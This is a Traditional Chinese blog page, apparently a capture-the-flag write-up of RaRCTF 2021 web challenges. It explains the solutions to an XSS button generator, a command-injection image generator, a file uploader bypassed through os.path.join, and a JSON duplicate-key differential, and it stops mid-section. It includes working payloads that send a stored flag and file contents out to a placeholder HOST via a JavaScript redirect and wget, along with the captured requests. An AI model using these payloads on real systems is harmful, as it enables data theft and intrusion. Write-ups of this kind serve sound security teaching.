@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="WebFancy Button Generator Check out this cool new fancy button generator! The buttons even glow!  將給出的附件原始碼下載，可以很明顯看出這是一個 XSS 的題目，同時使用了一個工作量證明（Proof Of Work）的驗證機制。  Proof of work: https:&#x2F;&#x2F;en.wikipedia">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RaRCTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/837b9c99.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="WebFancy Button Generator Check out this cool new fancy button generator! The buttons even glow!  將給出的附件原始碼下載，可以很明顯看出這是一個 XSS 的題目，同時使用了一個工作量證明（Proof Of Work）的驗證機制。  Proof of work: https:&#x2F;&#x2F;en.wikipedia">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2021-08-11T05:02:00.000Z">
+<meta property="article:modified_time" content="2021-08-15T13:24:41.093Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/avatar.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>RaRCTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-CN/posts/837b9c99.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/6b16e944.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/837b9c99.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/837b9c99.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&text=RaRCTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&is_video=false&description=RaRCTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RaRCTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/837b9c99.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&title=RaRCTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&name=RaRCTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/837b9c99.html&t=RaRCTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fancy-Button-Generator"><span class="toc-number">1.1.</span> <span class="toc-text">Fancy Button Generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lemonthinker"><span class="toc-number">1.2.</span> <span class="toc-text">lemonthinker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Secure-Uploader"><span class="toc-number">1.3.</span> <span class="toc-text">Secure Uploader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Microservices-As-A-Service-3"><span class="toc-number">1.4.</span> <span class="toc-text">Microservices As A Service 3</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        RaRCTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-11T05:02:00.000Z" itemprop="datePublished">2021-08-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Fancy-Button-Generator"><a href="#Fancy-Button-Generator" class="headerlink" title="Fancy Button Generator"></a>Fancy Button Generator</h3><blockquote>
+<p>Check out this cool new fancy button generator! The buttons even glow!</p>
+</blockquote>
+<p>將給出的附件原始碼下載，可以很明顯看出這是一個 XSS 的題目，同時使用了一個工作量證明（Proof Of Work）的驗證機制。</p>
+<blockquote>
+<p>Proof of work: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Proof_of_work">https://en.wikipedia.org/wiki/Proof_of_work</a></p>
+</blockquote>
+<p>題目的附件中給出了其計算方法。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> uuid.uuid4().<span class="built_in">hex</span>[:<span class="number">4</span>], uuid.uuid4().<span class="built_in">hex</span>[:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span>(<span class="params">prefix, suffix, answer, difficulty=<span class="number">6</span></span>):</span></span><br><span class="line">    <span class="built_in">hash</span> = hashlib.sha256(prefix.encode() + answer.encode() + suffix.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span>.endswith(<span class="string">&quot;0&quot;</span> * difficulty)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">prefix, suffix, difficulty</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        test = binascii.hexlify(os.urandom(<span class="number">4</span>)).decode()</span><br><span class="line">        <span class="keyword">if</span> verify(prefix, suffix, test, difficulty):</span><br><span class="line">            <span class="keyword">return</span> test</span><br></pre></td></tr></table></figure>
+
+<p>因此只需要先請求獲得字首和字尾，Solve 完成之後提交資料即可獲得一次傳送按鈕的權力。再來看 admin 是如何操作按鈕的，在給出的附件中有如下程式碼。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluate(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">localStorage</span>.flag = flag;</span><br><span class="line">    &#125;, process.env.FLAG);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> url = process.env.SITE + <span class="string">&quot;button?title=&quot;</span> + req.title + <span class="string">&quot;&amp;link=&quot;</span> + req.link;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Going to &quot;</span>, url);</span><br><span class="line">    <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">        waitUntil: <span class="string">&quot;networkidle2&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.click(<span class="string">&quot;#btn&quot;</span>);</span><br><span class="line">    <span class="keyword">await</span> page.waitForTimeout(TIMEOUT);</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    page = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+
+<p>很容易發現 admin 其實是直接點選了按鈕，然後等了一下就關閉了頁面。那麼此時只需要對按鈕進行 XSS 即可。使用 <code>javascript:alert(1)</code> 可以達成點選按鈕後彈窗的效果。因此可以在 GET 引數 link 處進行 XSS 來嘗試取出 localStorage.flag 然後發起一次對外的請求來獲取 flag。構造出如下指令碼來進行 XSS。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">host = <span class="string">&quot;https://fbg.rars.win/&quot;</span></span><br><span class="line">data = session.get(host + <span class="string">&quot;pow&quot;</span>).json()</span><br><span class="line">solution = solve(data[<span class="string">&#x27;pref&#x27;</span>], data[<span class="string">&#x27;suff&#x27;</span>], <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Solved POW: <span class="subst">&#123;solution&#125;</span> with prefix <span class="subst">&#123;data[<span class="string">&#x27;pref&#x27;</span>]&#125;</span> suffix <span class="subst">&#123;data[<span class="string">&#x27;suff&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">session.post(host + <span class="string">&quot;pow&quot;</span>, json=&#123;<span class="string">&quot;answer&quot;</span>: solution&#125;)</span><br><span class="line">name = <span class="string">&quot;&quot;</span></span><br><span class="line">link = <span class="string">&quot;javascript:window.location.replace(&#x27;http://HOST/?flagis-&#x27;%252BlocalStorage.getItem(&#x27;flag&#x27;))&quot;</span></span><br><span class="line">response = session.get(host + <span class="string">f&quot;admin?title=<span class="subst">&#123;name&#125;</span>&amp;link=<span class="subst">&#123;link&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>執行指令碼即可在埠監聽處得到如下請求資料，從而可以得到 flag。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flagis-rarctf&#123;th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.136.8.210:3255</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/92.0.4515.107 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="lemonthinker"><a href="#lemonthinker" class="headerlink" title="lemonthinker"></a>lemonthinker</h3><blockquote>
+<p>generate your lemonthinks here!</p>
+<p>Note: All characters that look like a <code>O</code> are actually a <code>0</code>, please  try replacing all <code>O</code>‘s with  <code>0</code>‘s if you find that your flag does not work.</p>
+</blockquote>
+<p>題目給出的原始碼如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time <span class="comment"># lemonthink</span></span><br><span class="line"></span><br><span class="line">clean = time.time()</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">chars = <span class="built_in">list</span>(string.ascii_letters + string.digits)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;index.html&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/generate&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> clean</span><br><span class="line">    <span class="keyword">if</span> time.time() - clean &gt; <span class="number">60</span>:</span><br><span class="line">      os.system(<span class="string">&quot;rm static/images/*&quot;</span>)</span><br><span class="line">      clean = time.time()</span><br><span class="line">    text = request.form.getlist(<span class="string">&#x27;text&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    text = text.replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filename = <span class="string">&quot;&quot;</span>.join(random.choices(chars,k=<span class="number">8</span>)) + <span class="string">&quot;.png&quot;</span></span><br><span class="line">    os.system(<span class="string">f&quot;python3 generate.py <span class="subst">&#123;filename&#125;</span> \&quot;<span class="subst">&#123;text&#125;</span>\&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;images/&#x27;</span> + filename), code=<span class="number">301</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  app.run(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">1002</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此時可以看出有一個引數可控，只需要傳入 text 即可進行 RCE。構造出如下載荷讀取檔案 /flag.txt 並使用 wget 帶出，靶機似乎沒有 curl。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(cat /flag.txt | xargs -I&#123;&#125; wget <span class="string">&quot;http://HOST/?flagis-&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>載荷傳送後在監聽端可以得到如下請求資料，即得到 flag。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flagis-rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.136.8.210:3255</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Wget</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Secure-Uploader"><a href="#Secure-Uploader" class="headerlink" title="Secure Uploader"></a>Secure Uploader</h3><blockquote>
+<p>A new secure, safe and smooth uploader!</p>
+</blockquote>
+<p>題目所給出的上傳和訪問路由的程式碼如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,))</span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit()</span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone()</span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br></pre></td></tr></table></figure>
+
+<p>可以發現檔案上傳之後會生成一個 id，然後訪問的時候只通過這個 id 進行檔案讀取。上傳時檔名中不允許有 . 字元，而其他的字元通通沒有處理，因此不能目錄穿越讀檔案。再看訪問的路由，使用了 <code>os.path.join</code> 來將檔名與路徑拼接從而進行讀取。在這個方法的文件中有如下一句話。</p>
+<blockquote>
+<p>If a component is an absolute path, all previous components are thrown away and joining continues from the absolute path component.</p>
+</blockquote>
+<p>假設此時的 <code>res[0]</code> 變成了絕對路徑，也就是 <code>/flag</code>，那麼此前的所有路徑就會被拋棄，進而讀取到根目錄下的 flag。因此構造出如下兩個請求來獲取 flag。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193.57.159.27:35294</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>282</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;/flag&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">Upload File</span><br><span class="line">------WebKitFormBoundary51X6ZmnbrL0hXAYM--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file/d129a262e4724c549cda37a51755e1bf</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>193.57.159.27:35294</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在使用第一個請求獲得的連結請求訪問檔案後可獲得 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rarctf&#123;4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Microservices-As-A-Service-3"><a href="#Microservices-As-A-Service-3" class="headerlink" title="Microservices As A Service 3"></a>Microservices As A Service 3</h3><p>manager 中的 update 路由將 JSON 資料由 Python 傳遞到 Golang 的服務中處理。JSON 的解析 Golang 中使用的模組是 github.com/buger/jsonparser。稍微測一下可以發現當 JSON 鍵值重複的時候其將選擇前者。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	str := <span class="string">&quot;&#123;\&quot;key\&quot;: \&quot;value1\&quot;, \&quot;key\&quot;: \&quot;value2\&quot;&#125;&quot;</span></span><br><span class="line">	bytes_str := []<span class="keyword">byte</span>(str)</span><br><span class="line">	fmt.Println(jsonparser.GetString(bytes_str, <span class="string">&quot;key&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面的程式碼的執行結果是 value1 &lt;nil&gt;。而在 Python 中，當 JSON 的鍵值重複時其將選擇後者。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">jObject = json.loads(<span class="string">&quot;&#123;\&quot;key\&quot;: \&quot;value1\&quot;, \&quot;key\&quot;: \&quot;value2\&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(jObject[<span class="string">&quot;key&quot;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>上面的程式碼的執行結果是 value2。因此此時只需要讓鍵值重複即可繞過限制修改 admin 即 id 為 0 的使用者的密碼。構造出如下的請求來修改 admin 的密碼。</p>
